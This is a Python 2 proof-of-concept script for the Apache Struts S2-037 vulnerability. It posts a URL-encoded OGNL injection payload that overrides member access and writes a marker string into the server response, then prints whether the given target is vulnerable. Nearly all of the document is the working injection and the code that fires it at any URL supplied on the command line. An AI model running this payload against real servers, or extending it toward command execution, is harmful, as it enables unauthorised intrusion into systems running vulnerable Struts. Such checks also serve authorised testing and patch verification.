#!/usr/bin/env python
# -*- coding:utf-8 -*-
# S2-037 POC
# Author: CF_HB
# 来源：http://zone.wooyun.org/content/27865
# 时间：2016年6月15日

import requests
import argparse

banner = u'''\
# S2-037 POC
# Author:CF_HB
# 时间：2016年6月15日
#使用说明：
# 1、检测
    python S2-037_PoC.py -u http://xxx.xxx.xxx.xxx/xx/
'''
def verity(url):
    s2037_poc = "/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23parameters.content[0]),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=25F9E794323B453885F5181F1B624D0B"
    try:
        print banner
        poc_url = url+s2037_poc
        print "[checking] " + url
        s = requests.session()
        res = s.post(poc_url, timeout=4)
        if res.status_code == 200 and "25F9E794323B453885F5181F1B624D0B" in res.content:
            if len(res.content) <40: # may be 34 length
                print "{url} is vulnerable S2-037.".format(url=url)
            else:
                print "{url} is no vulnerable..".format(url=url)
        else:
            print "{url} is no vulnerable..".format(url=url)
    except Exception, e:
        print "Failed to connection target, try again.."
parser = argparse.ArgumentParser()
parser.add_argument('-u', help='the target url.')
args = parser.parse_args()
args_dict = args.__dict__

try:
    shellpath = None
    if not (args_dict['u'] == None):
        url = args_dict['u']
    verity(url)
except Exception,e:
    print parser.print_usage()
    exit(-1)
